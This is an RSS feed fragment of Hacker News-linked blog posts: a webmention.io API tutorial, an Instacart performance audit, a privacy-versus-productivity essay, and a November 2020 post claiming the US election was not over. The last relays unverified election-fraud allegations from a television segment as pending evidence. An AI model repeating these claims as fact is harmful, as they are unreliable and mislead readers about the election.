        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"Steve Scaffidi"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/hercynium"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"html"</span><span>:</span> <span>"This is where I wish Perl5 had something like Python's AST class hierarchy…"</span><span>,</span>
                <span>"text"</span><span>:</span> <span>"This is where I wish Perl5 had something like Python's AST class hierarchy…"</span>
            <span>},</span>
            <span>"in-reply-to"</span><span>:</span> <span>"https://randomgeekery.org/2020/02/17/python-invoke/"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>"2020-02-18T03:11:58+00:00"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/hercynium/status/1229604443651526656"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>757935</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"in-reply-to"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-02-18T22:32:20Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/comment/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/2020/02/17/python-invoke/"</span>
        <span>}</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Aww, my first site reply.
From <a href="https://twitter.com/hercynium">hercynium</a>.</p>
<p>I only get 20 results by default, though.
Here.
Let’s make <a href="https://stedolan.github.io/jq/">jq</a> show us.
Here’s a default page.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> sort-dir<span>==</span>up <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>20
</code></pre><h3 id="handling-result-pagination">Handling result pagination</h3>
<p>I can specify how many responses I want in each response with the <code>per-page</code> parameter.
With <code>per-page</code> set to 100, I get a hundred entries.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> per-page<span>==</span><span>100</span> <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>100
</code></pre><p>Of course, if there aren’t a hundred entries to fill the page, I only get what’s available.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>since</span><span>==</span><span>"2020-10-26T04:07:20Z"</span> per-page<span>=</span><span>100</span> <span>\
</span><span></span>  <span>|</span> jq <span>'.children | length'</span>
</code></pre></div><pre><code>0
</code></pre><p>The <code>page</code> parameter — which starts at zero — lets me step through the feed in batches.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>\
</span><span></span>  <span>domain</span><span>==</span>randomgeekery.org <span>\
</span><span></span>  <span>token</span><span>==</span><span>$WEBMENTION_KEY</span> <span>\
</span><span></span>  sort-dir<span>==</span>up <span>\
</span><span></span>  <span>page</span><span>==</span><span>1</span>
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>"brian wisti"</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>"https://webmention.io/avatar/…"</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>"https://twitter.com/brianwisti"</span>
            <span>},</span>
            <span>"content"</span><span>:</span> <span>{</span>
                <span>"html"</span><span>:</span> <span>"…"</span><span>,</span>
                <span>"text"</span><span>:</span> <span>"…"</span><span>,</span>
            <span>},</span>
            <span>"in-reply-to"</span><span>:</span> <span>"https://randomgeekery.org/2020/01/19/restructuredtext-basics-for-blogging/"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>"2020-03-10T06:24:45+00:00"</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://twitter.com/brianwisti/status/1237263101482823681"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>766993</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"in-reply-to"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-03-10T06:38:55Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://brid-gy.appspot.com/comment/twitter/brianwisti/…"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org/2020/01/19/restructuredtext-basics-for-blogging/"</span>
        <span>},</span>
        <span>⋮</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>Right.
That’s Bridgy catching a Twitter thread.
At least I can see the full conversation from my site.
Or I wil once I’m done fixing everything.</p>
<h3 id="bonus-checking-for-reactions-to-a-specific-post">Bonus: checking for reactions to a specific post</h3>
<p>I could get a JF2 feed for specific URLs on my site if I was so inclined.</p>
<div><pre><code data-lang="shell">http get https://webmention.io/api/mentions.jf2 <span>target</span><span>==</span>https://randomgeekery.org
</code></pre></div><div><pre><code data-lang="json"><span>{</span>
    <span>"children"</span><span>:</span> <span>[</span>
        <span>{</span>
            <span>"author"</span><span>:</span> <span>{</span>
                <span>"name"</span><span>:</span> <span>""</span><span>,</span>
                <span>"photo"</span><span>:</span> <span>""</span><span>,</span>
                <span>"type"</span><span>:</span> <span>"card"</span><span>,</span>
                <span>"url"</span><span>:</span> <span>""</span>
            <span>},</span>
            <span>"mention-of"</span><span>:</span> <span>"https://randomgeekery.org"</span><span>,</span>
            <span>"published"</span><span>:</span> <span>null</span><span>,</span>
            <span>"type"</span><span>:</span> <span>"entry"</span><span>,</span>
            <span>"url"</span><span>:</span> <span>"https://kevq.uk/blogroll/"</span><span>,</span>
            <span>"wm-id"</span><span>:</span> <span>796241</span><span>,</span>
            <span>"wm-private"</span><span>:</span> <span>false</span><span>,</span>
            <span>"wm-property"</span><span>:</span> <span>"mention-of"</span><span>,</span>
            <span>"wm-received"</span><span>:</span> <span>"2020-05-14T11:25:47Z"</span><span>,</span>
            <span>"wm-source"</span><span>:</span> <span>"https://kevq.uk/blogroll/"</span><span>,</span>
            <span>"wm-target"</span><span>:</span> <span>"https://randomgeekery.org"</span>
        <span>}</span>
    <span>],</span>
    <span>"name"</span><span>:</span> <span>"Webmentions"</span><span>,</span>
    <span>"type"</span><span>:</span> <span>"feed"</span>
<span>}</span>
</code></pre></div><p>I deal with my site reactions in bulk so they can be incorporated in the Hugo build.
This could be handy for JavaScript-driven update on reactions since the site was last built and pushed, though.</p>
<h2 id="rebuilding-the-local-mentions-file">Rebuilding the local mentions file</h2>
<p>Now I want to take what I learned about the API to build a local copy of my site’s mention history.
Let’s step away from HTTPie and the command line before I try something dangerous.</p>
<p>The <a href="https://requests.readthedocs.io/en/master/">requests</a> library for <a href="https://randomgeekery.org/tags/python">Python</a> can help me build one list of Webmentions.</p>
<div><pre><code data-lang="python"><span>import</span> <span>json</span>
<span>import</span> <span>os</span>
<span>import</span> <span>time</span>

<span>import</span> <span>requests</span>

<span>def</span> <span>rebuild_full_feed</span><span>(</span><span>domain</span><span>:</span> <span>str</span><span>,</span> <span>token</span><span>:</span> <span>str</span><span>,</span> <span>target_file</span><span>:</span> <span>str</span><span>)</span> <span>-&gt;</span> <span>None</span><span>:</span>
    <span>endpoint</span> <span>=</span> <span>"https://webmention.io/api/mentions.jf2"</span>
    <span>page_size</span> <span>=</span> <span>100</span>
    <span>all_entries</span> <span>=</span> <span>[]</span>
    <span>page_index</span> …</code></pre></div></section></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/">https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/</a></em></p>]]>
            </description>
            <link>https://randomgeekery.org/post/2020/11/using-the-webmentionio-api/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059318</guid>
            <pubDate>Wed, 11 Nov 2020 15:49:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Instacart Web Performance Audit]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25059265">thread link</a>) | @toddgardner
<br/>
November 11, 2020 | https://requestmetrics.com/web-performance/performance-profiling-instacart | <a href="https://web.archive.org/web/*/https://requestmetrics.com/web-performance/performance-profiling-instacart">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Grocery shopping is tedious and time consuming.  In search of a more streamlined experience, I decided to try Instacart.  Unfortunately, using their site is <em>also</em> tedious and time consuming.</p>

<!--more-->

<h2 id="common-actions-take-too-long">Common Actions Take Too Long</h2>
<p>In the video you’ll see I attempt to visit the landing page of my local grocery store and, after that loads, do a search for <em>yogurt</em>.</p>

<figure>
    <video controls="" muted="" preload="metadata">
        <source src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-load-and-search.mp4" type="video/mp4">
    </video>
    <figcaption>Visiting a grocery store homepage and searching for items.</figcaption>
</figure>

<p>Over <strong>25</strong> seconds to perform a single load and search.  Just loading the Cub Foods “storefront” page took <strong>14</strong> seconds and <strong>154</strong> requests.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-total-stats.png" alt="Loading a single storefront">
    <figcaption>Network stats for loading a single storefront in Instacart.</figcaption>
</figure>

<p>On the plus side there were some very nice placeholder graphics that set the mood while I waited.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-placeholder.png" alt="Placeholder graphics for days">
</figure>

<h3 id="when-its-not-javascripts-fault">When it’s not JavaScript’s Fault</h3>
<p>Usually when I look at “modern” websites the main performance culprit is JavaScript.  Too many scripts doing too much rendering.  While Instacart <em>does</em> have too much JavaScript, they have a bigger problem: <strong>the server</strong>.</p>

<h4 id="the-initial-page-load-is-slow">The Initial Page Load is Slow</h4>
<p>Instacart uses some combination of server and client rendering.  On the one hand, it’s great that they don’t just load a blank page with a big spinner in the middle and wait for 20MB of JavaScript to load.</p>
<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-page.png" alt="3 seconds to load the basic page skeleton">
</figure>
<p>On the other hand it took <strong>3</strong> seconds to get the single page layout skeleton back.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-skeleton.png" alt="Just a basic SPA template">
    <figcaption>Three seconds for some placeholder template HTML is a bit long.</figcaption>
</figure>

<p>The images to populate the placeholder template took another few seconds:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-image.png" alt="4 seconds for a background image">
</figure>

<p>If you notice the first segment of the URL after the Cloudfront domain is <code>/156x/</code>. These endpoints will return custom sized images and that first segment is the requested dimensions.  You can change that segment to <code>/300x/</code>, for example, and you’ll get a bigger image that maintains aspect ratio (it will be 300px wide by whatever the height should be to keep the ratio).  You can also specify a height if you want a different effect:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-custom-image-size.png" alt="Custom images sizes are great, but costly for performance">
</figure>

<p>Cool, but this is almost certainly part of the reason loading uncached images is so slow. The origin behind Cloudfront is doing a lot of work to make a custom image and send it over the wire on-demand.</p>

<p>In all fairness, these images have the proper cache response headers, so subsequent page loads will have the images served from the browser memory cache.  But that first hit is very slow.</p>

<h4 id="the-api-is-slow-too">The API is Slow Too</h4>
<p>It isn’t just the page load and images that are slow.  The servers responding to API requests are taking their time as well.  Some of the calls to populate data on the page took over <strong>5</strong> seconds!</p>
<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-api.png" alt="Several API calls took over 5 seconds">
</figure>

<p>One of the endpoints shown here fetches coupon information.  In the initial loading video you can see the coupon section is particularly slow to render.  Even though there is content loaded below the fold, the user has no idea since the placeholders are still shown for the coupon section until that call returns.</p>

<h4 id="placeholders-are-nice-but-faster-endpoints-are-better">Placeholders are Nice But Faster Endpoints are Better</h4>

<p>This is where the hybrid rendering model falls apart a bit.  There is a lot of dynamic content being rendered post page load.  And since the API is slow the user is getting even more placeholders.</p>

<p>As the user scrolls down the page there are on-demand API calls made to show products from each grocery department.  These calls can take upwards of 2 seconds each.  And there’s a lot of them.</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-slow-department.png" alt="On-demand API calls to load additional products are slow.">
</figure>

<p>For each one we get more placeholder graphics until the server returns its response:</p>

<figure>
    <img src="https://requestmetrics.com/assets/images/webperf/perf-instacart/insta-more-placeholders.png" alt="Placeholders are cool, but speed would be better.">
</figure>

<p>Placeholders do a nice job of minimizing jank or <a href="https://requestmetrics.com/web-performance/cumulative-layout-shift">cumulative layout shift</a> but they are a poor substitute for the actual content.  Paradoxically I find they can also make a site feel slower since the UI is changing out from under the user so frequently.</p>

<h3 id="maybe-instacart-doesnt-think-it-has-a-performance-problem">Maybe Instacart Doesn’t Think It Has a Performance Problem?</h3>
<p>There’s a <a href="https://tech.instacart.com/building-instacarts-view-model-api-part-1-why-view-model-4362f64ffd2a">few articles</a> on <a href="https://tech.instacart.com/scaling-at-instacart-distributing-data-across-multiple-postgres-databases-with-rails-13b1e4eba202">the Instacart engineering blog</a> discussing the back-end technical implementation of the site.  In both the linked articles they discuss “improved performance” and the existing “healthy performance” of the site.  Perhaps the main problem is they don’t think there’s a performance issue to fix?</p>

<p>Most modern technical stacks are capable of serving pages and API calls in sub-second time if that’s the company’s goal.  I suspect in this case they have limited resources and other priorities.  Maybe things are better in the phone app, but I think I’ll stick with going to the grocery store for now, it’s faster.</p>

</div></div>]]>
            </description>
            <link>https://requestmetrics.com/web-performance/performance-profiling-instacart</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059265</guid>
            <pubDate>Wed, 11 Nov 2020 15:44:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Productivity vs. Privacy]]>
            </title>
            <description>
<![CDATA[
Score 49 | Comments 14 (<a href="https://news.ycombinator.com/item?id=25059205">thread link</a>) | @jessems
<br/>
November 11, 2020 | https://jessems.com/productivity-vs-privacy | <a href="https://web.archive.org/web/*/https://jessems.com/productivity-vs-privacy">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div><p>In recent years there's been a steady growth in privacy focused companies. Some examples that have reached large-scale adoption are <a href="https://protonmail.com/">ProtonMail</a>, <a href="https://signal.com/">Signal</a>, and <a href="https://duckduckgo.com/">DuckDuckGo</a>. These are companies that have put privacy front and center to their value proposition and can be considered <em>privacy-preserving products</em>. I've come to beleive a goal of preserving user privacy is often inherently in tension with the goal of advancing user productivity.</p><p>What these services have in common is that they promise their users a higher degree of privacy relative to their competitors. Instead of the usual encryption in transit (protection from eavesdroppers) and encryption at rest (protection against unauthorized users), services like Signal and ProtonMail enable their users to hide data from anyone except the intended recipient, which — crucially — includes the service providers themselves.</p><p>This category of encryption is known as end-to-end encryption (e2e) and has found adopters in anyone from principled libertarians to journalists and human rights activitists whose lives may depend on their conversations remaining unwiretapped.</p><h2>Early privacy-preserving software was too difficult to use</h2><p>The canonical implementation of e2e for email is known as Pretty Good Privacy (PGP) and its reference implementation is GPG. GPG never reached mass adoption and there seems to be a myriad of reasons for that. The most salient reason, however, seems to be that to this day, it continues to be difficult to use. As the founder of Signal, Moxie Marlinspike <a href="https://moxie.org/2015/02/24/gpg-and-me.html">explains</a>, the spirit behind GPG was the following:</p><blockquote><p>Instead of developing opinionated software with a simple interface, GPG was written to be as powerful and flexible as possible.</p></blockquote><p>Powerful, flexible software written by nerds, unfortunately also tends to be prohibitively complex for normal users. Combined with the fact that <a href="https://signal.org/blog/the-ecosystem-is-moving/">decentralized technology seems unable to quickly adapt to change</a>, the result has been a clunky solution that has, quite frankly, stayed clunky. With no feasible privacy-preserving alternative <!-- -->[1]<!-- -->, non-privacy preserving email providers became the norm.</p><h2>Surveillance capitalist companies will not encrypt your data, because they rely on being able to read it</h2><p>One such email provider, Gmail by Google, gained millions of users by offering a free plan. Their initial monetization strategy was scanning your emails and serving you personalized ads. Although they've stopped personalizing the ads, they're still scanning your email's contents to serve you a better experience across their services. Similarly, Facebook tracks what you do to shape your experience and keep you glued (they would say 'engaged') to their platform.</p><p>What unites platforms like Google and Facebook, is described by Professor Shoshana Zuboff as “<a href="https://en.wikipedia.org/wiki/Surveillance_capitalism">surveillance capitalism</a>”. The business model of surveillance capitalist companies is to harvest personal data about you to build a model that predicts your behavior. These prediction models are packaged and sold as advertisement opportunities to companies eager to buy your attention. You might be the user, but you're not the customer — the advertisers are.</p><p>It should come as no surprise then, that none of these platforms has shipped with end-to-end encryption by default. Doing so would go against the incentives that undergird their very business model. Their ability to predict your behavior, and sell ads based on those predictions, hinges on their ability to harvest your data.</p><h2>Data is also collected to improve the service</h2><p>A company like Google has other business models of course. Google Workspace, aimed at businesses, is a collection of collaboration and productivity tools. This ranges from Google Docs, to chat, to video conferencing, and more. By offering this as a paid service, Google exposes itself to a different incentive, one where the customer and the user are now one and the same.</p><p>Even if you're both the user and the customer, your data is still being harvested. This data might not feed into personalized ads (because that’s no longer the primary business model) but rather into improving your experience. But as a business user, when does your experience improve? And as a service provider, how do you know what improves the experience?</p><h2>Improvements are productivity gains</h2><p>There's an inclination to think of improvements as things that help you do the thing you want to do quicker, better and/or with less frustration. We can go one step further and borrow some of the thinking used in economics and treat productivity simply as the ratio between outputs (salaries and corporate profits) and inputs (hours worked). Productivity increases if inputs can be decreased (for equal outputs) or outputs can be increased (for equal inputs). What's more, we would expect this quantity to improve along with advances in technology.</p><p>How does technology lead to increases in productivity? One obvious way is by making us more efficient. If some new technology saves us time doing a certain task (decreased input), all other things being equal, we’ll end up seeing those gains reflected in our outputs.</p><h2>Productivity gains are discovered, not planned</h2><p>What exactly are the things that increase efficiency? Here's where it gets tricky. In the realm of knowledge work, we don't always know where the gains will come from — that is, before they are made. We are still discovering new ways in which we can be more productive and especially so in the domain of collaborative productivity. An illustrative example of how productivity gains are discovered comes from Kevin A. Kwok's description of Figma's road to success.</p><p>In "Why Figma Wins", <a href="https://kwokchain.com/2020/06/19/why-figma-wins/">Kwok details</a> how the product team discovered a way to enable more efficient collaboration in the design process. That this potential existed wasn't at all  obvious to even those within the scene. While Sketch had broken new ground with their vector based design tool geared towards product designers, Figma took it to another level by taking many of the same (dare I say revolutionary) UX patterns and offering them in a web-native, multiplayer web application.</p><blockquote><p>The core insight of Figma is that design is larger than just designers. Design is all of the conversations between designers and PMs about what to build. It is the mocks and prototypes and the feedback on them. It is the handoff of specs and assets to engineers and how easy it is for them to implement them.</p></blockquote><p>As Kevin explains, Figma brought together the disparate disciplines that are involved in a design process into a synced browser window for everybody. This helped democratize design and remove a lot of friction that had existed before.</p><p>Not only did Figma push the frontier of productivity into new territory, it wasn’t obvious beforehand what that territory would look like. The lesson is that productivity improvements are won through a process of <em>discovery</em>. Kevin explains:</p><blockquote><p>As disciplines evolve, they figure out the social norms needed to operate better, build tools that can be shared across the industry, and invent abstractions that allow offloading more and more of the workload. They learn how to collaborate better, not just with each other but with all the other functions as well.</p></blockquote><p>Although there's some inherent uncertainty about what the productivity gains will look like (and where to look for them), there's no uncertainty about whether they will be made at all. If one thing can be counted on, it's the tech industry's relentless march towards higher productivity. The big tech platforms know this and don't shy away from investing heavily in innovation (discovery) in that direction.</p><h2>Productivity gains are unlocked by harvesting data</h2><p>Although there is some inherent tension between preserving privacy vs. allowing for a multiplayer mode like Figma, we can find even stronger tensions when it comes to harvesting data in favor of productivity gains.</p><p>A search feature relies on indexing your data. A recommendation feature relies on mining your browsing history. An autocomplete feature relies on what you (or other users) typed before.</p><p>All these potential features which are made possible through harvesting your user data are not available to privacy-preserving products. The user data isn't readable to them — and that's the whole point.</p><p>This creates a trade-off from the user's perspective. Whatever your particular motivation might be, as soon as you opt for a privacy-preserving service you're opting for a service that is not able to read your data, and by extension, not able to harvest it. Because the harvesting of data is what is driving many of the improvements in productivity, in choosing to preserve user privacy, these services are forgoing their ability to provide additional gains in productivity.</p><p>Historically, as we saw with the origins of GPG, there has always been additional friction involved in replicating a workflow in a privacy-preserving manner. Although using e2e services such as Signal and ProtonMail has become nearly frictionless, they lack many features their non-privacy preserving counterparts offer.</p><h2>The productivity gap between privacy-preserving and non-preserving services</h2><p>If you compare the productivity gains between privacy-preserving and non-preserving products from the perspective of the user, it's hard not to arrive at the conclusion that there’s a gap between the two — and it appears to be growing.</p><p>There is perhaps no better example of a feature which hinges on the ability to read user data than search. Although ProtonMail is reminiscent of Gmail in many ways, one area where it falls short is the absence of any ability to  search the contents of your emails. Search only works if the provider of such functionality can scan and index your content. It works even better if the provider is able to harvest search queries and use those to build predictive models (e.g. autocomplete and smart suggestions). These are features which make Gmail users more productive but aren't available to ProtonMail users <!-- -->[3]<!-- -->.</p><p>The absence of search might not be a dealbreaker for a …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jessems.com/productivity-vs-privacy">https://jessems.com/productivity-vs-privacy</a></em></p>]]>
            </description>
            <link>https://jessems.com/productivity-vs-privacy</link>
            <guid isPermaLink="false">hacker-news-small-sites-25059205</guid>
            <pubDate>Wed, 11 Nov 2020 15:37:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Public Safety Announcement: The 2020 Election Is Not Over]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25059009">thread link</a>) | @lettergram
<br/>
November 11, 2020 | https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/ | <a href="https://web.archive.org/web/*/https://austingwalters.com/public-safety-announcement-the-2020-election-is-not-over-as-of-nov-11-2020/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-3754">

<div>
<p>I have been listening to my friends and family and am concerned that many are not aware of the election process. Having the presidential election flip from Democrat to Republican at this point can cause massive rioting, violence, etc.</p>
<p>We should all be aware of the current situation and the news outlets do not appear to be informing people.</p>
<blockquote><p><strong>Disclaimer</strong>: I’m am not pro-democrat or pro-republican. Personally, I believe neither party is fit to run the country.</p></blockquote>
<p>I wanted to share what appears to be the Republican strategy and why it’s possible (though still unlikely) Trump could win.</p>
<p>At time of writing Trump the betting markets have <a href="https://electionbettingodds.com/4hr.html" target="_blank" rel="noopener noreferrer">13% odds of winning the election</a> (odds calculated average from <a href="https://www.betfair.com/exchange/plus/politics">Betfair</a> and <a href="https://www.predictit.org/promo/electionbetting">PredictIt</a>).</p>
<p><a href="https://www.predictit.org/markets/detail/3698/Who-will-win-the-2020-US-presidential-election" target="_blank" rel="noopener noreferrer">PredictIt</a> currently has 16% odds of Trump winning:</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" alt="" width="500" height="344" srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w" sizes="(max-width: 500px) 100vw, 500px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12.png 666w, https://austingwalters.com/wp-content/uploads/2020/11/Screenshot-from-2020-11-11-09-06-12-300x206.png 300w"></a></p>
<h3>Biden is not Officially the President-Elect</h3>
<p>The president elect is determined by the electoral college or the General Services Administration (aka Trump conceding). That did not occur.</p>
<p>This is not uncommon, from <a href="https://en.wikipedia.org/wiki/President-elect_of_the_United_States" target="_blank" rel="noopener noreferrer">wikipedia</a>:</p>
<blockquote><p>The closest instance of there being no qualified person to take the presidential oath of office on Inauguration Day happened in 1877 when the disputed election between Rutherford B. Hayes and Samuel J. Tilden was decided and certified in Hayes’ favor just three days before the inauguration (then March 4).</p></blockquote>
<h3>Evidence, Pending Review</h3>
<p>It takes time to build evidence. Last night on <a href="https://www.youtube.com/watch?v=7WzYTSwt18k" target="_blank" rel="noopener noreferrer">Fox News (Hannity, 11/10/2020)</a> the Republicans discussed some of the election (video may be removed, not on Fox News website).</p>
<p>The Republicans claim 11,000+ incident reports of vote manipulation, currently being vetted by attorneys. 250+ affidavits already signed, many have corroborating physical evidence, photos or additional witnesses (unclear how much). In a section below, some specific claims are covered.</p>
<h3>The Voting Recount Process</h3>
<ol>
<li>Affidavit is necessary to challenge some ballots</li>
<li>After canvassing, Republicans can request a recount</li>
<li>A judges in each county can review evidence (aka affidavits, photos, etc)</li>
<li>The judge can remove ballots (at random) based on evidence</li>
<li>Judgements can be challenged to a higher court</li>
<li>Recount occurs after ballots removed</li>
<li>IF it’s so wide spread or there’s a major error. The house or senate decide (or special elections), it depends on the State.</li>
<li>Electors vote on to December 14 and delivered December 23rd [<a href="https://crsreports.congress.gov/product/pdf/IF/IF11641">1</a>]</li>
</ol>
<h4>State Government Affiliation(s)</h4>
<ul>
<li><a href="https://en.wikipedia.org/wiki/Pennsylvania_General_Assembly" target="_blank" rel="noopener noreferrer">PA</a>, <a href="https://en.wikipedia.org/wiki/Michigan_Legislature" target="_blank" rel="noopener noreferrer">MI</a>, <a href="https://en.wikipedia.org/wiki/Wisconsin_Legislature" target="_blank" rel="noopener noreferrer">WI</a> and <a href="https://en.wikipedia.org/wiki/Georgia_General_Assembly" target="_blank" rel="noopener noreferrer">GA</a> have a fairly large republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Arizona_State_Legislature" target="_blank" rel="noopener noreferrer">AZ</a> has a slight republican majority of both houses</li>
<li><a href="https://en.wikipedia.org/wiki/Nevada_Legislature" target="_blank" rel="noopener noreferrer">NV</a> has a large Democrat majority in both houses</li>
</ul>
<p>It’s also still possible the United States Supreme Court could still toss hundreds of thousands of ballots out of PA (Biden’s up by 40k)[<a href="https://www.washingtonexaminer.com/news/republican-state-attorneys-general-ask-supreme-court-to-take-up-pennsylvania-late-mail-in-ballot-case" target="_blank" rel="noopener noreferrer">2</a>].</p>
<h3>Affidavit Claims</h3>
<p>Selected claims on Fox / Hannity (on 11/10/2020):</p>
<p>1. There was a “software bug” in one jurisdiction, the exact same software was used in half of Michigan and multiple states. Only the one county noted the fix. They want to re-evaluate and manually recount in said counties. Code reviews requested.</p>
<p>2. Pennsylvania USPS (more than one) said the postal service was backdating ballots AND collecting ballots after the date (prior to back dating, i.e. they knew)</p>
<p>3. Michigan had a lot of dead people vote &gt;50 for one county, thus far that they’ve found.</p>
<p>4. All the states have laws enabling the voting process to be accessible to the public, due to COVID-19 they limited public observers, particularly from independents. Legal challenges can occur, as that is against many states laws.</p>
<p>5. Democrat poll watchers were handing out pamphlets on “how to distract GOP poll watchers”</p>
<p>6. Poll watchers claim to have seen ballots with the same or no signatures be counted in Michigan</p>
<h3>Personal Opinion</h3>
<p>Personally, I believe this is the correct course of action. I’m not sure I believe all the claims.</p>
<p>However, I think it’s very important we challenge the votes, see where it falls and improve the Republic. Even if we do it after the election, it’s important we identify fraud and / or improve the process so this doesn’t happen again.</p>
<p>Unfortunately, the news media is not presenting this very well. I am concerned this will lead to a civil war. The Democratic party knows they are not officially the president elect, yet hold press conferences, that look like this…</p>
<p><a href="https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png"><img loading="lazy" src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" alt="" width="792" height="530" srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w" sizes="(max-width: 792px) 100vw, 792px" data-old-src="//austingwalters.com/wp-content/plugins/a3-lazy-load/assets/images/lazy_placeholder.gif" data-src="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png" data-srcset="https://austingwalters.com/wp-content/uploads/2020/11/president-elect-1024x685.png 1024w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-300x201.png 300w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect-768x514.png 768w, https://austingwalters.com/wp-content/uploads/2020/11/president-elect.png 1514w"></a>I’m not convinced this wont lead to violence. I’m concerned because it looks like <em>if the Democrats lose the election.</em> There will be a rival government setup. Several <a href="https://www.cnn.com/2020/11/07/americas/biden-global-reaction-election-intl/index.html" target="_blank" rel="noopener noreferrer">foreign powers have already acknowledged Biden as the 